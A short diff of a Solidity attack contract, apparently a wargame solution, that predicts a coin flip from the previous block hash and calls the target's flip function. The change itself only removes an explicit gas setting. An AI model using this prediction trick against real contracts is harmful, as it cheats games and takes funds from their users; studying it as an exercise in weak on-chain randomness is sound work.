@@ -10,6 +10,6 @@ contract HackCoinFlip {
     uint256 blockValue = uint256(blockhash(block.number.sub(1)));
     bool side = blockValue.div(FACTOR) == 1 ? true : false;
     // calling function in target manually
-    address(0x71E54a06EbF7D7292B11Dd912EcD28E1c1D29FF9).call.gas(100000)(abi.encodeWithSignature("flip(bool)", side));
+    address(0x71E54a06EbF7D7292B11Dd912EcD28E1c1D29FF9).call(abi.encodeWithSignature("flip(bool)", side));
   }
 }
